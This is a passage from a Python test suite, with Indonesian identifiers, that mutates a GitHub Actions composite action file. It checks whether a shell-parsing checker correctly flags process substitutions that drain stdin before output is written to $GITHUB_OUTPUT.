                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru89 = isi_aksi89.replace(
                baris_tulis89,
                baris_tulis89.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(&>- wc -l; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru89 != isi_aksi89, \
            "suntikan aksi89 tidak menembak"
        with open(berkas_aksi89, "w", encoding="utf-8") as f:
            f.write(isi_baru89)
        rc, out = jalan(subtutupout,
                        [sys.executable, GERBANG, "--semua"])
        periksa("stdout ditutup di awalan tidak menyembunyikan "
                "pembaca: gerbang gagal (Audit 985)", rc != 0)
        shutil.rmtree(subtutupout, ignore_errors=True)

        subxargsredir = klon(tmp, "subxargsredir")
        berkas_aksi90 = os.path.join(
            subxargsredir, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi90, encoding="utf-8") as f:
            isi_aksi90 = f.read()
        baris_tulis90 = [b for b in isi_aksi90.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru90 = isi_aksi90.replace(
                baris_tulis90,
                baris_tulis90.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs cat < /dev/null; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru90 != isi_aksi90, \
            "suntikan aksi90 tidak menembak"
        with open(berkas_aksi90, "w", encoding="utf-8") as f:
            f.write(isi_baru90)
        rc, out = jalan(subxargsredir,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect masukan sesudah anak xargs milik xargs "
                "sendiri: gerbang lolos (Audit 986)", rc == 0)
        shutil.rmtree(subxargsredir, ignore_errors=True)

        subcommandstr = klon(tmp, "subcommandstr")
        berkas_aksi91 = os.path.join(
            subcommandstr, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi91, encoding="utf-8") as f:
            isi_aksi91 = f.read()
        baris_tulis91 = [b for b in isi_aksi91.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru91 = isi_aksi91.replace(
                baris_tulis91,
                baris_tulis91.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(env -S 'command cat'; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru91 != isi_aksi91, \
            "suntikan aksi91 tidak menembak"
        with open(berkas_aksi91, "w", encoding="utf-8") as f:
            f.write(isi_baru91)
        rc, out = jalan(subcommandstr,
                        [sys.executable, GERBANG, "--semua"])
        periksa("'command' di dalam string env -S adalah program "
                "tak ada: gerbang lolos (Audit 987)", rc == 0)
        shutil.rmtree(subcommandstr, ignore_errors=True)

        subcommandganda = klon(tmp, "subcommandganda")
        berkas_aksi92 = os.path.join(
            subcommandganda, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi92, encoding="utf-8") as f:
            isi_aksi92 = f.read()
        baris_tulis92 = [b for b in isi_aksi92.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru92 = isi_aksi92.replace(
                baris_tulis92,
                baris_tulis92.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(command command wc -l; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru92 != isi_aksi92, \
            "suntikan aksi92 tidak menembak"
        with open(berkas_aksi92, "w", encoding="utf-8") as f:
            f.write(isi_baru92)
        rc, out = jalan(subcommandganda,
                        [sys.executable, GERBANG, "--semua"])
        periksa("'command' sesudah 'command' tetap transparan: "
                "gerbang gagal (Audit 988)", rc != 0)
        shutil.rmtree(subcommandganda, ignore_errors=True)

        subpidpalsu = klon(tmp, "subpidpalsu")
        berkas_aksi93 = os.path.join(
            subpidpalsu, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi93, encoding="utf-8") as f:
            isi_aksi93 = f.read()
        baris_tulis93 = [b for b in isi_aksi93.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru93 = isi_aksi93.replace(
                baris_tulis93,
                baris_tulis93.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ionice -p 1234 wc -l; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru93 != isi_aksi93, \
            "suntikan aksi93 tidak menembak"
        with open(berkas_aksi93, "w", encoding="utf-8") as f:
            f.write(isi_baru93)
        rc, out = jalan(subpidpalsu,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bentuk pid ionice adalah mode pid, bukan perintah: "
                "gerbang lolos (Audit 989)", rc == 0)
        shutil.rmtree(subpidpalsu, ignore_errors=True)

        subxargsfd = klon(tmp, "subxargsfd")
        berkas_aksi94 = os.path.join(
            subxargsfd, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi94, encoding="utf-8") as f:
            isi_aksi94 = f.read()
        baris_tulis94 = [b for b in isi_aksi94.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru94 = isi_aksi94.replace(
                baris_tulis94,
                baris_tulis94.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs cat 3<berkasKeluaran; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru94 != isi_aksi94, \
            "suntikan aksi94 tidak menembak"
        with open(berkas_aksi94, "w", encoding="utf-8") as f:
            f.write(isi_baru94)
        rc, out = jalan(subxargsfd,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect fd bukan-0 sesudah anak xargs tak "
                "mengganti stdin xargs, jadi xargs sungguh menguras "
                "dan penulis kebagian EOF: gerbang gagal (Audit 995)",
                rc != 0)
        shutil.rmtree(subxargsfd, ignore_errors=True)

        subxargslekat = klon(tmp, "subxargslekat")
        berkas_aksi95 = os.path.join(
            subxargslekat, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi95, encoding="utf-8") as f:
            isi_aksi95 = f.read()
        baris_tulis95 = [b for b in isi_aksi95.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru95 = isi_aksi95.replace(
                baris_tulis95,
                baris_tulis95.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs cat a<berkasKeluaran; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru95 != isi_aksi95, \
            "suntikan aksi95 tidak menembak"
        with open(berkas_aksi95, "w", encoding="utf-8") as f:
            f.write(isi_baru95)
        rc, out = jalan(subxargslekat,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect masukan merekat di tengah kata sesudah "
                "anak xargs milik xargs sendiri: gerbang lolos "
                "(Audit 996)", rc == 0)
        shutil.rmtree(subxargslekat, ignore_errors=True)

        suboperandfd = klon(tmp, "suboperandfd")
        berkas_aksi96 = os.path.join(
            suboperandfd, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi96, encoding="utf-8") as f:
            isi_aksi96 = f.read()
        baris_tulis96 = [b for b in isi_aksi96.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru96 = isi_aksi96.replace(
                baris_tulis96,
                baris_tulis96.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat 3<berkasKeluaran; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru96 != isi_aksi96, \
            "suntikan aksi96 tidak menembak"
        with open(berkas_aksi96, "w", encoding="utf-8") as f:
            f.write(isi_baru96)
        rc, out = jalan(suboperandfd,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect fd bukan-0 di posisi operand tak "
                "mengganti stdin, jadi cat sungguh menguras dan "
                "penulis kebagian EOF: gerbang gagal (Audit 997)",
                rc != 0)
        shutil.rmtree(suboperandfd, ignore_errors=True)

        subtasksetgabung = klon(tmp, "subtasksetgabung")
        berkas_aksi97 = os.path.join(
            subtasksetgabung, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi97, encoding="utf-8") as f:
            isi_aksi97 = f.read()
        baris_tulis97 = [b for b in isi_aksi97.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru97 = isi_aksi97.replace(
                baris_tulis97,
                baris_tulis97.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(taskset -pc 0 wc -l; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru97 != isi_aksi97, \
            "suntikan aksi97 tidak menembak"
        with open(berkas_aksi97, "w", encoding="utf-8") as f:
            f.write(isi_baru97)
        rc, out = jalan(subtasksetgabung,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bendera gabungan taskset -pc adalah mode pid, "
                "bukan perintah: gerbang lolos (Audit 998)",
                rc == 0)
        shutil.rmtree(subtasksetgabung, ignore_errors=True)

        subfdnol = klon(tmp, "subfdnol")
        berkas_aksi98 = os.path.join(
            subfdnol, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi98, encoding="utf-8") as f:
            isi_aksi98 = f.read()
        baris_tulis98 = [b for b in isi_aksi98.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru98 = isi_aksi98.replace(
                baris_tulis98,
                baris_tulis98.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(00<berkasKeluaran cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru98 != isi_aksi98, \
            "suntikan aksi98 tidak menembak"
        with open(berkas_aksi98, "w", encoding="utf-8") as f:
            f.write(isi_baru98)
        rc, out = jalan(subfdnol,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect fd 00 adalah fd 0: segmen pertama bukan "
                "penguras — gerbang lolos (Audit 1004)", rc == 0)
        shutil.rmtree(subfdnol, ignore_errors=True)

        subopsiredirect = klon(tmp, "subopsiredirect")
        berkas_aksi99 = os.path.join(
            subopsiredirect, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi99, encoding="utf-8") as f:
            isi_aksi99 = f.read()
        baris_tulis99 = [b for b in isi_aksi99.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru99 = isi_aksi99.replace(
                baris_tulis99,
                baris_tulis99.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(head -n 3<berkasKeluaran; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru99 != isi_aksi99, \
            "suntikan aksi99 tidak menembak"
        with open(berkas_aksi99, "w", encoding="utf-8") as f:
            f.write(isi_baru99)
        rc, out = jalan(subopsiredirect,
                        [sys.executable, GERBANG, "--semua"])
        periksa("token redirect sesudah opsi bernilai bukan nilai "
                "opsi: segmen pertama bukan penguras — gerbang "
                "lolos (Audit 1005)", rc == 0)
        shutil.rmtree(subopsiredirect, ignore_errors=True)

        subionicebundel = klon(tmp, "subionicebundel")
        berkas_aksi100 = os.path.join(
            subionicebundel, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi100, encoding="utf-8") as f:
            isi_aksi100 = f.read()
        baris_tulis100 = [b for b in isi_aksi100.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru100 = isi_aksi100.replace(
                baris_tulis100,
                baris_tulis100.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ionice -tc 2 cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru100 != isi_aksi100, \
            "suntikan aksi100 tidak menembak"
        with open(berkas_aksi100, "w", encoding="utf-8") as f:
            f.write(isi_baru100)
        rc, out = jalan(subionicebundel,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bundel ionice -tc bernilai-terpisah adalah "
                "penguras: gerbang gagal (Audit 1006)", rc != 0)
        shutil.rmtree(subionicebundel, ignore_errors=True)

        subdupambig = klon(tmp, "subdupambig")
        berkas_aksi101 = os.path.join(
            subdupambig, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi101, encoding="utf-8") as f:
            isi_aksi101 = f.read()
        baris_tulis101 = [b for b in isi_aksi101.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru101 = isi_aksi101.replace(
                baris_tulis101,
                baris_tulis101.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs cat <&0x; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru101 != isi_aksi101, \
            "suntikan aksi101 tidak menembak"
        with open(berkas_aksi101, "w", encoding="utf-8") as f:
            f.write(isi_baru101)
        rc, out = jalan(subdupambig,
                        [sys.executable, GERBANG, "--semua"])
        periksa("target duplikasi bersufiks huruf ditolak bash: "
                "segmen pertama bukan penguras — gerbang lolos "
                "(Audit 1007)", rc == 0)
        shutil.rmtree(subdupambig, ignore_errors=True)

        subpindahfd = klon(tmp, "subpindahfd")
        berkas_aksi102 = os.path.join(
            subpindahfd, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi102, encoding="utf-8") as f:
            isi_aksi102 = f.read()
        baris_tulis102 = [b for b in isi_aksi102.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru102 = isi_aksi102.replace(
                baris_tulis102,
                baris_tulis102.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat <&0-; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru102 != isi_aksi102, \
            "suntikan aksi102 tidak menembak"
        with open(berkas_aksi102, "w", encoding="utf-8") as f:
            f.write(isi_baru102)
        rc, out = jalan(subpindahfd,
                        [sys.executable, GERBANG, "--semua"])
        periksa("duplikasi bersufiks pindah-fd <&0- adalah "
                "penguras: gerbang gagal (Audit 1011)", rc != 0)
        shutil.rmtree(subpindahfd, ignore_errors=True)

        subdupnol = klon(tmp, "subdupnol")
        berkas_aksi103 = os.path.join(
            subdupnol, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi103, encoding="utf-8") as f:
            isi_aksi103 = f.read()
        baris_tulis103 = [b for b in isi_aksi103.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru103 = isi_aksi103.replace(
                baris_tulis103,
                baris_tulis103.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat 0<&0; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru103 != isi_aksi103, \
            "suntikan aksi103 tidak menembak"
        with open(berkas_aksi103, "w", encoding="utf-8") as f:
            f.write(isi_baru103)
        rc, out = jalan(subdupnol,
                        [sys.executable, GERBANG, "--semua"])
        periksa("duplikasi berawalan fd 0<&0 adalah penguras: "
                "gerbang gagal (Audit 1014)", rc != 0)
        shutil.rmtree(subdupnol, ignore_errors=True)

        subflock = klon(tmp, "subflock")
        berkas_aksi104 = os.path.join(
            subflock, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi104, encoding="utf-8") as f:
            isi_aksi104 = f.read()
        baris_tulis104 = [b for b in isi_aksi104.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru104 = isi_aksi104.replace(
                baris_tulis104,
                baris_tulis104.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(flock kunci.lock cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru104 != isi_aksi104, \
            "suntikan aksi104 tidak menembak"
        with open(berkas_aksi104, "w", encoding="utf-8") as f:
            f.write(isi_baru104)
        rc, out = jalan(subflock,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pembaca terbungkus flock adalah penguras: "
                "gerbang gagal (Audit 1015)", rc != 0)
        shutil.rmtree(subflock, ignore_errors=True)

        subpindahbatal = klon(tmp, "subpindahbatal")
        berkas_aksi105 = os.path.join(
            subpindahbatal, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi105, encoding="utf-8") as f:
            isi_aksi105 = f.read()
        baris_tulis105 = [b for b in isi_aksi105.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru105 = isi_aksi105.replace(
                baris_tulis105,
                baris_tulis105.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat 1<&0-; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru105 != isi_aksi105, \
            "suntikan aksi105 tidak menembak"
        with open(berkas_aksi105, "w", encoding="utf-8") as f:
            f.write(isi_baru105)
        rc, out = jalan(subpindahbatal,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pindah-fd bersumber 0 menutup stdin: segmen "
                "pertama bukan penguras — gerbang lolos "
                "(Audit 1016)", rc == 0)
        shutil.rmtree(subpindahbatal, ignore_errors=True)

        subkata = klon(tmp, "subkata")
        berkas_aksi106 = os.path.join(
            subkata, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi106, encoding="utf-8") as f:
            isi_aksi106 = f.read()
        baris_tulis106 = [b for b in isi_aksi106.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru106 = isi_aksi106.replace(
                baris_tulis106,
                baris_tulis106.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(exec cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru106 != isi_aksi106, \
            "suntikan aksi106 tidak menembak"
        with open(berkas_aksi106, "w", encoding="utf-8") as f:
            f.write(isi_baru106)
        rc, out = jalan(subkata,
                        [sys.executable, GERBANG, "--semua"])
        periksa("awalan kata kunci exec transparan: pembaca di "
                "baliknya adalah penguras — gerbang gagal "
                "(Audit 1020)", rc != 0)
        shutil.rmtree(subkata, ignore_errors=True)

        subgrup = klon(tmp, "subgrup")
        berkas_aksi107 = os.path.join(
            subgrup, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi107, encoding="utf-8") as f:
            isi_aksi107 = f.read()
        baris_tulis107 = [b for b in isi_aksi107.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru107 = isi_aksi107.replace(
                baris_tulis107,
                baris_tulis107.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >((cat); "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru107 != isi_aksi107, \
            "suntikan aksi107 tidak menembak"
        with open(berkas_aksi107, "w", encoding="utf-8") as f:
            f.write(isi_baru107)
        rc, out = jalan(subgrup,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grup subshell terurai: (cat) adalah penguras — "
                "gerbang gagal (Audit 1021)", rc != 0)
        shutil.rmtree(subgrup, ignore_errors=True)

        subpipa = klon(tmp, "subpipa")
        berkas_aksi108 = os.path.join(
            subpipa, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi108, encoding="utf-8") as f:
            isi_aksi108 = f.read()
        baris_tulis108 = [b for b in isi_aksi108.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru108 = isi_aksi108.replace(
                baris_tulis108,
                baris_tulis108.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat | tee log.txt; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru108 != isi_aksi108, \
            "suntikan aksi108 tidak menembak"
        with open(berkas_aksi108, "w", encoding="utf-8") as f:
            f.write(isi_baru108)
        rc, out = jalan(subpipa,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pipa dalam segmen: elemen pertama yang dinilai — "
                "gerbang gagal (Audit 1022)", rc != 0)
        shutil.rmtree(subpipa, ignore_errors=True)

        subflockc = klon(tmp, "subflockc")
        berkas_aksi109 = os.path.join(
            subflockc, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi109, encoding="utf-8") as f:
            isi_aksi109 = f.read()
        baris_tulis109 = [b for b in isi_aksi109.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru109 = isi_aksi109.replace(
                baris_tulis109,
                baris_tulis109.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(flock kunci.lock -c cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru109 != isi_aksi109, \
            "suntikan aksi109 tidak menembak"
        with open(berkas_aksi109, "w", encoding="utf-8") as f:
            f.write(isi_baru109)
        rc, out = jalan(subflockc,
                        [sys.executable, GERBANG, "--semua"])
        periksa("flock bentuk string -c: nilainya adalah perintah "
                "penguras — gerbang gagal (Audit 1023)", rc != 0)
        shutil.rmtree(subflockc, ignore_errors=True)

        suboperand = klon(tmp, "suboperand")
        berkas_aksi110 = os.path.join(
            suboperand, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi110, encoding="utf-8") as f:
            isi_aksi110 = f.read()
        baris_tulis110 = [b for b in isi_aksi110.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru110 = isi_aksi110.replace(
                baris_tulis110,
                baris_tulis110.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat <(cat); "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru110 != isi_aksi110, \
            "suntikan aksi110 tidak menembak"
        with open(berkas_aksi110, "w", encoding="utf-8") as f:
            f.write(isi_baru110)
        rc, out = jalan(suboperand,
                        [sys.executable, GERBANG, "--semua"])
        periksa("substitusi masukan sebagai operand: isinya "
                "menguras stdin bersama — gerbang gagal "
                "(Audit 1024)", rc != 0)
        shutil.rmtree(suboperand, ignore_errors=True)

        with open(GERBANG, encoding="utf-8") as f:
            isi_gerbang_1030 = f.read()
        periksa("definisi _substitusi_masukan_menguras tunggal "
                "(Audit 1030)",
                isi_gerbang_1030.count(
                    "def _substitusi_masukan_menguras") == 1)

        subcmdsub = klon(tmp, "subcmdsub")
        berkas_aksi116 = os.path.join(
            subcmdsub, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi116, encoding="utf-8") as f:
            isi_aksi116 = f.read()
        baris_aksi116 = [b for b in isi_aksi116.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru116 = isi_aksi116.replace(
                baris_aksi116,
                baris_aksi116.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat $(cat); cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru116 != isi_aksi116, \
            "suntikan aksi116 tidak menembak"
        with open(berkas_aksi116, "w", encoding="utf-8") as f:
            f.write(isi_baru116)
        rc, out = jalan(subcmdsub,
                        [sys.executable, GERBANG, "--semua"])
        periksa("substitusi perintah sebagai operand: isinya menguras — gerbang gagal (Audit 1036)", rc != 0)
        shutil.rmtree(subcmdsub, ignore_errors=True)

        subflockstr = klon(tmp, "subflockstr")
        berkas_aksi115 = os.path.join(
            subflockstr, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi115, encoding="utf-8") as f:
            isi_aksi115 = f.read()
        baris_aksi115 = [b for b in isi_aksi115.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru115 = isi_aksi115.replace(
                baris_aksi115,
                baris_aksi115.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(flock kunci.lock -c 'cat berkasLain'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru115 != isi_aksi115, \
            "suntikan aksi115 tidak menembak"
        with open(berkas_aksi115, "w", encoding="utf-8") as f:
            f.write(isi_baru115)
        rc, out = jalan(subflockstr,
                        [sys.executable, GERBANG, "--semua"])
        periksa("string flock -c multi-kata dinilai utuh: cat berkas bukan penguras — gerbang lolos (Audit 1035)", rc == 0)
        shutil.rmtree(subflockstr, ignore_errors=True)

        subsudo = klon(tmp, "subsudo")
        berkas_aksi117 = os.path.join(
            subsudo, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi117, encoding="utf-8") as f:
            isi_aksi117 = f.read()
        baris_aksi117 = [b for b in isi_aksi117.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru117 = isi_aksi117.replace(
                baris_aksi117,
                baris_aksi117.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sudo cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru117 != isi_aksi117, \
            "suntikan aksi117 tidak menembak"
        with open(berkas_aksi117, "w", encoding="utf-8") as f:
            f.write(isi_baru117)
        rc, out = jalan(subsudo,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pembungkus sudo transparan: pembaca di baliknya penguras — gerbang gagal (Audit 1044)", rc != 0)
        shutil.rmtree(subsudo, ignore_errors=True)

        subexecopsi = klon(tmp, "subexecopsi")
        berkas_aksi111 = os.path.join(
            subexecopsi, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi111, encoding="utf-8") as f:
            isi_aksi111 = f.read()
        baris_aksi111 = [b for b in isi_aksi111.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru111 = isi_aksi111.replace(
                baris_aksi111,
                baris_aksi111.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(exec -c cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru111 != isi_aksi111, \
            "suntikan aksi111 tidak menembak"
        with open(berkas_aksi111, "w", encoding="utf-8") as f:
            f.write(isi_baru111)
        rc, out = jalan(subexecopsi,
                        [sys.executable, GERBANG, "--semua"])
        periksa("opsi milik exec dilompati: exec -c cat adalah penguras — gerbang gagal (Audit 1031)", rc != 0)
        shutil.rmtree(subexecopsi, ignore_errors=True)

        subtimeakh = klon(tmp, "subtimeakh")
        berkas_aksi112 = os.path.join(
            subtimeakh, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi112, encoding="utf-8") as f:
            isi_aksi112 = f.read()
        baris_aksi112 = [b for b in isi_aksi112.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru112 = isi_aksi112.replace(
                baris_aksi112,
                baris_aksi112.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(time -- cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru112 != isi_aksi112, \
            "suntikan aksi112 tidak menembak"
        with open(berkas_aksi112, "w", encoding="utf-8") as f:
            f.write(isi_baru112)
        rc, out = jalan(subtimeakh,
                        [sys.executable, GERBANG, "--semua"])
        periksa("time -- adalah akhir opsi: pembaca sesudahnya penguras — gerbang gagal (Audit 1032)", rc != 0)
        shutil.rmtree(subtimeakh, ignore_errors=True)

        subexecset = klon(tmp, "subexecset")
        berkas_aksi113 = os.path.join(
            subexecset, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi113, encoding="utf-8") as f:
            isi_aksi113 = f.read()
        baris_aksi113 = [b for b in isi_aksi113.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru113 = isi_aksi113.replace(
                baris_aksi113,
                baris_aksi113.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(exec A=1 cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru113 != isi_aksi113, \
            "suntikan aksi113 tidak menembak"
        with open(berkas_aksi113, "w", encoding="utf-8") as f:
            f.write(isi_baru113)
        rc, out = jalan(subexecset,
                        [sys.executable, GERBANG, "--semua"])
        periksa("penetapan sesudah exec adalah nama program: bukan penguras — gerbang lolos (Audit 1033)", rc == 0)
        shutil.rmtree(subexecset, ignore_errors=True)

        subcmdkata = klon(tmp, "subcmdkata")
        berkas_aksi114 = os.path.join(
            subcmdkata, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi114, encoding="utf-8") as f:
            isi_aksi114 = f.read()
        baris_aksi114 = [b for b in isi_aksi114.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru114 = isi_aksi114.replace(
                baris_aksi114,
                baris_aksi114.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(command time cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru114 != isi_aksi114, \
            "suntikan aksi114 tidak menembak"
        with open(berkas_aksi114, "w", encoding="utf-8") as f:
            f.write(isi_baru114)
        rc, out = jalan(subcmdkata,
                        [sys.executable, GERBANG, "--semua"])
        periksa("kata kunci di balik command tak transparan: bukan penguras — gerbang lolos (Audit 1034)", rc == 0)
        shutil.rmtree(subcmdkata, ignore_errors=True)

        subfilter = klon(tmp, "subfilter")
        berkas_aksi118 = os.path.join(
            subfilter, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi118, encoding="utf-8") as f:
            isi_aksi118 = f.read()
        baris_aksi118 = [b for b in isi_aksi118.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru118 = isi_aksi118.replace(
                baris_aksi118,
                baris_aksi118.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sha256sum; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru118 != isi_aksi118, \
            "suntikan aksi118 tidak menembak"
        with open(berkas_aksi118, "w", encoding="utf-8") as f:
            f.write(isi_baru118)
        rc, out = jalan(subfilter,
                        [sys.executable, GERBANG, "--semua"])
        periksa("filter aliran murni tanpa operand adalah penguras — gerbang gagal (Audit 1037)", rc != 0)
        shutil.rmtree(subfilter, ignore_errors=True)

        subskrip = klon(tmp, "subskrip")
        berkas_aksi119 = os.path.join(
            subskrip, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi119, encoding="utf-8") as f:
            isi_aksi119 = f.read()
